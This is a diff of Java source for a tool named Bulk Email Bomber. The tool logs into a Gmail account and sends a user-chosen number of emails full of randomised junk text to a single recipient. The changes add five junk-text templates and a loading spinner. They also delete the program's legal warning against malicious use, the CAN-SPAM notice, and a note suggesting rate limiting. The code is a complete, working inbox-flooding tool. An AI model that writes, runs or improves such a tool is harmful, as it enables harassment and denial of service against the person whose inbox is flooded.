@@ -1,56 +1,78 @@
 /*----------------------------------------------------------------------------------------------------------------------
-    This program sends a specified number of emails to a recipient using the provided sender email address.
-    The emails contain randomized text, and the recipient's email address is validated using JavaMail API.
-    Note: A Gmail App Password is required to send emails. An alternative method is to use SMTP, but this
-    method requires more setup and would be a pain in the long run.
+    SETUP INSTRUCTIONS:
+    - Add the JavaMail API to your project’s classpath:
+    https://www.oracle.com/java/technologies/javamail-releases.html
 
-    REMEMBER TO SET UP THE REQUIRED DEPENDENCIES:
-    - Add the JavaMail API to your project's classpath.
-    JavaMail API: https://www.oracle.com/java/technologies/javamail-releases.html.
+    (Optional) For SMTP, add the JavaMail SMTP Transport API:
+    https://mvnrepository.com/artifact/com.sun.mail/smtp.
 
-    (Optional) - To use SMTP instead of JavaMail API, follow these steps:
-    - Add the JavaMail SMTP Transport API to your project's classpath.
-    JavaMail SMTP Transport API: https://mvnrepository.com/artifact/com.sun.mail/smtp.
+    GMAIL ACCOUNT CONFIGURATION:
+    - Enable "App Passwords" in your Gmail settings for secure access via the JavaMail API.
+    - Generate a unique password for your account specifically for this program.
 
-    SETUP GMAIL ACCOUNT:
-    - Go to your Gmail account settings.
-    - Set up a Gmail account and enable "App Passwords" to allow access to your account via JavaMail API.
-    (This is a very secure method and other persons cannot access your Gmail unless you share the code)
+    GITHUB REPOSITORY:
+    - Visit the GitHub repository for information and tutorials related to this project.
+    - https://github.com/GraycenMacNeill/BulkEmailBomber
 ----------------------------------------------------------------------------------------------------------------------*/
 
-// TODO - Create a third party interface instead of program being console based so that the program can be integrated into a larger system.
-// TODO - Enhance the email generation to include more complex text and make it more engaging.
-// TODO - Add security measures to protect the Gmail App Password.
+package com.github.GraycenMacNeill.BulkEmailBomber;
 
-package com.github.GraycenMacNeill.BulkEmailBomber; // This package contains the main class for the Bulk Email Bomber program.
-
-import javax.mail.*; // For sending emails
-import javax.mail.internet.*; // For backwards compatibility
-import java.util.*; // Import for handling emails, scanner, and MIME types
-import java.util.concurrent.ThreadLocalRandom; // Import for random number generation
+import javax.mail.*;
+import javax.mail.internet.*;
+import java.util.*;
+import java.lang.Thread;
+import java.util.concurrent.ThreadLocalRandom;
 
 public class Main {
 
-    // Asks for the user's email, the recipient's email, the number of emails to send, and the Gmail App Password.
+    private static final String RED = "\u001B[31m";
+    private static final String WHITE = "\u001B[0m";
+
     public static void main(String[] args) {
 
-        displayInformation(); // Display GitHub repository link and legal cautions when using the program.
+        displayInformation();
 
-        // Creates a new UserInteraction object to get user input
         UserInteraction userInteraction = new UserInteraction();
 
-        // Get user input for the required fields.
+        String subjectBase = "default";
+        String bodyBase = "default";
+
         String senderEmail = userInteraction.getSenderEmail(); // STEP 1: Get sender email
         String password = userInteraction.getPassword(); // STEP 2: Get the Gmail App Password
         String recipientEmail = userInteraction.getRecipientEmail(); // STEP 3: Get the recipient email
         int numberOfEmailsToSend = userInteraction.getNumberOfEmailsToSend(); // STEP 4: Get number of emails to send
+        int emailTemplate = userInteraction.getEmailTemplate(); // STEP 5: Get the email template
 
-        // The list of different ASCII characters, letters, numbers, and symbols, and words for
-        // the body and subject of the emails.
-        String subjectBase = "! @ # $ % ^ & * ( ) - _ = + [ { } ; ' : , . < > / ? Ω ≈ ç √ ı ˜ Â Ò ˚ Ô Ó © Ï Î Í Å ∏ Ø ˆ ¨ Á † ® ´ ∑ Œ a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z apple banana cherry date egg frog grape honey imitation jack-fruit kangaroo lemon mango orange pear peach plum pineapple queen rabbit raspberry strawberry tangerine watermelon xanadu yogurt ⴀ ▒ ☠ ☮ ☯ ♠ Ω ♤ ♣ ♧ ♥ ♡ ♦ ♢ ♔ ♕ ♚ ♛ ⚜ ★ ☆ ✮ ✯ ☄ ☾ ☽ ☼ ☀ ☁ ☂ ☃ ☻ ☺ ☹ ۞ ۩ εїз Ƹ̵̡Ӝ̵̨̄Ʒ ξЖЗ εжз ☎ ☏ ¢ ☚ ☛ ☜ ☝ ☟ ✍ ✌ ☢ ☣ ♨ ๑ ❀ ✿ ψ ♆ ☪ ♪ ♩ ♫ ♬ ✄ ✂ ✆ ✉ ✦ ✧♱ ♰ ∞ ♂ ♀ ☿ ❤ ❥ ❦ ❧ ™ ® © ✖ ✗ ✘ ♒ ■ □ ▢ ▲ △ ▼ ▽ ◆ ◇ ○ ◎ ● ◯ Δ";
-        String bodyBase = "! @ # $ % ^ & * ( ) - _ = + [ { } ; ' : , . < > / ? Ω ≈ ç √ ı ˜ Â Ò ˚ Ô Ó © Ï Î Í Å ∏ Ø ˆ ¨ Á † ® ´ ∑ Œ a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z apple banana cherry date egg frog grape honey imitation jack-fruit kangaroo lemon mango orange pear peach plum pineapple queen rabbit raspberry strawberry tangerine watermelon xanadu yogurt ⴀ ▒ ☠ ☮ ☯ ♠ Ω ♤ ♣ ♧ ♥ ♡ ♦ ♢ ♔ ♕ ♚ ♛ ⚜ ★ ☆ ✮ ✯ ☄ ☾ ☽ ☼ ☀ ☁ ☂ ☃ ☻ ☺ ☹ ۞ ۩ εїз Ƹ̵̡Ӝ̵̨̄Ʒ ξЖЗ εжз ☎ ☏ ¢ ☚ ☛ ☜ ☝ ☟ ✍ ✌ ☢ ☣ ♨ ๑ ❀ ✿ ψ ♆ ☪ ♪ ♩ ♫ ♬ ✄ ✂ ✆ ✉ ✦ ✧♱ ♰ ∞ ♂ ♀ ☿ ❤ ❥ ❦ ❧ ™ ® © ✖ ✗ ✘ ♒ ■ □ ▢ ▲ △ ▼ ▽ ◆ ◇ ○ ◎ ● ◯ Δ";
+        if (emailTemplate == 1) { // Fastest Email Generation
+            subjectBase = "01234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950";
+            bodyBase = "01234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950";
+            delay(1000);
 
-        // Gmail configuration (use Gmail's implemented App Password)
+        } else if (emailTemplate == 2) { // Fast Email Generation
+            subjectBase = "apple banana basketball date egg frog Napoleon honey imitation jack-fruit work lemon mango computer pear";
+            bodyBase = "angry banana cherry date egg frog daily honey imitation jack-fruit kangaroo lemon day orange need";
+            delay(1000);
+
+        } else if (emailTemplate == 3) { // Slow Email Generation
+            subjectBase = "¡™£¢∞§¶•ªº–≠œ∑´®†¥¨ˆøπ«åß∂ƒ©˙∆˚¬…æΩ≈ç√∫˜µ≤≥µ";
+            bodyBase = "¡™£¢∞§¶•ªº–≠œ∑´®†¥¨ˆøπ«åß∂ƒ©˙∆˚¬…æΩ≈ç√∫˜µ≤≥µ";
+            delay(1000);
+
+        }  else if (emailTemplate == 4) { // Very Slow Email Generation
+            subjectBase = "ツ♋웃유Σ⊗♒☠☮☯♠Ω♤♣♧♥♡♦♢♔♕♚♛★☆✮✯☄☾☽☼☀☁☂☃☻☺۞۩♬✄✂✆✉✦✧∞❤❥❦❧™®©✗✘⊗♒▢▲△▼▽◆◇○◎●◯Δ◕◔ʊϟღ回₪✓✔✕✖☢☣";
+            bodyBase = "ツ♋웃유Σ⊗♒☠☮☯♠Ω♤♣♧♥♡♦♢♔♕♚♛★☆✮✯☄☾☽☼☀☁☂☃☻☺۞۩♬✄✂✆✉✦✧∞❤❥❦❧™®©✗✘⊗♒▢▲△▼▽◆◇○◎●◯Δ◕◔ʊϟღ回₪✓✔✕✖☢☣";
+            delay(1000);
+
+        } else if (emailTemplate == 5) { // Slowest Email Generation
+            subjectBase = "Ǆஹ௸௵ဪ﷽ÿþýüûúù﷽ø÷öõôòñðïîíìëêéè﷽çæåäãâáàßÞÝÜÛÚÙØÖÕÔÒǄஹ௸௵ဪÿ﷽";
+            bodyBase = "Ǆஹ௸௵ဪ﷽ÿþýüûúù﷽ø÷öõôòñðïîíìëêéè﷽çæåäãâáàßÞÝÜÛÚÙØÖÕÔÒǄஹ௸௵ဪÿ﷽";
+            delay(1000);
+
+        }
+
+        loadingScreen();
+
+        // Email configuration (this uses Gmail's App Password)
         // For security reasons, never hardcode your credentials in your code!!!
         Properties mailProps = new Properties();
         mailProps.put("mail.smtp.host", "smtp.gmail.com");
@@ -59,7 +81,7 @@ public class Main {
         mailProps.put("mail.smtp.starttls.enable", true);
 
         // Create a Session object with password authentication
-        // This will be replaced with your Gmail App Password
+        // The password variable will be replaced with your Gmail App Password
         Session session = Session.getInstance(mailProps, new Authenticator() {
             @Override
             protected PasswordAuthentication getPasswordAuthentication() {
@@ -68,9 +90,6 @@ public class Main {
             }
         });
 
-        // Loop to send emails
-        // Generate random strings for subject and body
-        // This could be optimized by using a more efficient data structure or algorithm
         for (int i = 0; i < numberOfEmailsToSend; i++) {
             try {
                 // Create a new message object for each email
@@ -82,6 +101,7 @@ public class Main {
                 String randomSubject = generateRandomString(subjectBase);
                 String randomBody = generateRandomString(bodyBase);
 
+                // Set the email subject and body to the randomized strings
                 message.setSubject(randomSubject);
                 message.setText(randomBody);
 
@@ -95,47 +115,53 @@ public class Main {
             } catch (MessagingException e) {
                 System.err.println("An error occurred while sending the email: " + e.getMessage());
             }
+
         }
 
     }
 
+    // Function to delay the execution of the program for a specified number of milliseconds
+    public static void delay(int milliseconds) {
+        try {
+            Thread.sleep(milliseconds);
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+            System.err.println(RED + "Thread was interrupted, failed to complete delay");
+        }
+    }
+
     // Function to generate random string with a specified base string
+    // Generate random length up to 5 characters longer than base
     public static String generateRandomString(String base) {
-        int randomLength = ThreadLocalRandom.current().nextInt(base.length() + 3); // Generate random length up to 5 characters longer than base
+        int baseLength = base.length(); // Store the length of the base string
+        int randomLength = ThreadLocalRandom.current().nextInt(baseLength + 5);
         StringBuilder randomStringBuilder = new StringBuilder(randomLength);
+
         for (int j = 0; j < randomLength; j++) {
-            int randomIndex = ThreadLocalRandom.current().nextInt(base.length());
+            int randomIndex = ThreadLocalRandom.current().nextInt(baseLength); // Reuse baseLength
             randomStringBuilder.append(base.charAt(randomIndex));
         }
         return randomStringBuilder.toString();
     }
 
     // Function to display program information and legal cautions
-// To prevent misuse, the program displays a warning message and a link to the GitHub repository.
+    // To prevent misuse, the pro gram displays a warning message and a link to the GitHub repository.
     public static void displayInformation() {
-        System.out.println("\u001B[31m" + "╔╗ ╦ ╦╦  ╦╔═  ╔═╗╔╦╗╔═╗╦╦    ╔╗ ╔═╗╔╦╗╔╗ ╔═╗╦═╗\n" +
-                "╠╩╗║ ║║  ╠╩╗  ║╣ ║║║╠═╣║║    ╠╩╗║ ║║║║╠╩╗║╣ ╠╦╝\n" +
-                "╚═╝╚═╝╩═╝╩ ╩  ╚═╝╩ ╩╩ ╩╩╩═╝  ╚═╝╚═╝╩ ╩╚═╝╚═╝╩╚═");
-        System.out.println("\u001B[0m" + "\nBulk Email Bomber (BEB) is a general use tool designed to efficiently send ");
-        System.out.println("large volumes of emails using Gmail to a specific recipient.");
+        System.out.println(WHITE + "Bulk Email Bomber (BEB) is a general use tool designed to efficiently");
+        System.out.println("send large volumes of emails using Gmail to a specific recipient.");
         System.out.println("\nhttps://github.com/GraycenMacNeill/BulkEmailBomber");
-        System.out.println("\u001B[31m" + "\nWARNING: This application is designed for educational and experimental use only. Any unauthorized or");
-        System.out.println("malicious use of this code is strictly prohibited and may violate applicable data protection laws,");
-        System.out.println("such as the CAN-SPAM Act. Such misuse could result in legal penalties, depending on your jurisdiction.\n" + "\u001B[0m");
     }
 
+    public static void loadingScreen() {
+        String[] loadingSteps = {"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"};  // Loading animations
+
+        for (int i = 0; i < 3; i++) {  // Loop for a few iterations of the animation
+            for (String step : loadingSteps) {
+                System.out.print("\r" + step);  // \r moves the cursor back to the start of the line
+                delay(100);  // Delay between steps, 100 milliseconds
+            }
+        }
+        System.out.println("\rSending emails to recipient:         \n");
+    }
 
 }
-/*----------------------------------------------------------------------------------------------------------------------
-Note: The provided code is a simple implementation of a bulk email bomber using JavaMail API. It includes basic
-user interaction, email generation, and Gmail configuration, and the following parameters.
-
-To enhance the security and efficiency of this program, you can consider implementing the following improvements:
-
-1. Use a secure and encrypted connection for sending emails.
-2. Implement rate limiting to prevent abuse.
-3. Implement a more efficient data structure or algorithm for generating random strings.
-4. Use a more secure and efficient method for storing and retrieving Gmail credentials.
-5. Implement a feature to allow users to choose the recipient email addresses from a list of predefined addresses.
-Remember to follow the relevant data protection laws and guidelines when implementing these improvements!
-----------------------------------------------------------------------------------------------------------------------*/
